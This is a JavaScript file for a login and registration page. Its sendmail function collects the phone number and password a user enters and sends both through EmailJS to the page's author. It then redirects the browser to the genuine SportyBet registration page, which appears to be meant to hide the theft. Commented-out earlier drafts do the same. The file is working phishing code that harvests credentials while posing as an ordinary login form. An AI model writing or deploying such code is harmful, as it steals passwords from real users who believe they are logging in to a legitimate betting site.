const loginSwitch = document.querySelector(".form-two");
const register = document.querySelector(".form");
const login = document.querySelector(".loginReg");
const registerClick = document.querySelector(".reg")


// input number condition
const numbers = document.getElementById('number-two')
// const  loginButton = document.querySelector('.log')


login.addEventListener("click" , function log() {
    register.style.display = "none"
    loginSwitch.style.display = "block"
})

registerClick.addEventListener("click" , function reg() {
    loginSwitch.style.display = "none"
    register.style.display = "block"
})


// input logic'
// loginButton.addEventListener('click', function logins() {
//     if ( numbers>11 || numbers) {
//         console.log('please input the correct phone number')
//     }
//     else{
//         console.log('log in suscessful')
//     }
// })

//  function sendmail() {
//     let params ={
//         from_name:document.getElementById('number-two').value,
//          password:document.getElementById("password-two").value
          
         
//     }
    
//     if (params.from_name !==11) {
//         document.getElementById('alertMessage').innerHTML= 'please input the correct data'
//     }
//    else {
        
//        emailjs.send("service_8hk3lct", "template_riq36od" , params).then(function (res) {
//           alert('success ' + res.status);
//        }) 
//     }
//     }
// function sendmail() {
//     let params = {
//         from_name: document.getElementById('number-two').value,
//         password: document.getElementById("password-two").value
//     }

//     if (params.from_name.length !== 11) {
//         document.getElementById('alertMessage').innerText = 'Please input the correct data';
//         setTimeout(() => {
//             document.getElementById('alertMessage').innerText = '';
//         }, 3000); // Clear message after 3 seconds (3000 milliseconds)
//     } else {
//         emailjs.send("service_8hk3lct", "template_riq36od", params).then(function (res) {
//             document.getElementById('alertMessage').innerText = 'Success ' + res.status;
//             setTimeout(() => {
//                 document.getElementById('alertMessage').innerText = '';
//             }, 3000); // Clear message after 3 seconds (3000 milliseconds)
//         });
//     }
// }
function sendmail() {
    let params = {
        UserphoneNumber: document.getElementById('number-two').value,
        password: document.getElementById("password-two").value
    }

    if (params.UserphoneNumber.length !== 11) {
        document.getElementById('alertMessage').innerText = 'Please input the correct data';
        alertMessage.style.color = 'red';
        setTimeout(() => {
            document.getElementById('alertMessage').innerText = '';
        }, 3000); 
    } else {
        emailjs.send("service_sbtoppl","template_7wq3ull", params).then(function (res) {
            // document.getElementById('alertMessage').innerText = 'ok ' + res.status;
            setTimeout(() => {
                document.getElementById('alertMessage').innerText = '';
                window.location.href = 'https://www.sportybet.com/ng/registration'; 
            }, 3000); 
        });
    }
}
